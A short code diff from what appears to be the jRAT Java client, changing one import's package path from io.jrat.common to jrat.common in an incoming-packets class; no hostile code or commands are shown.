@@ -1,6 +1,6 @@
 package jrat.client.packets.incoming;
 
-import io.jrat.common.downloadable.JavaArchive;
+import jrat.common.downloadable.JavaArchive;
 import jrat.client.Connection;
 import jrat.client.utils.Utils;
 
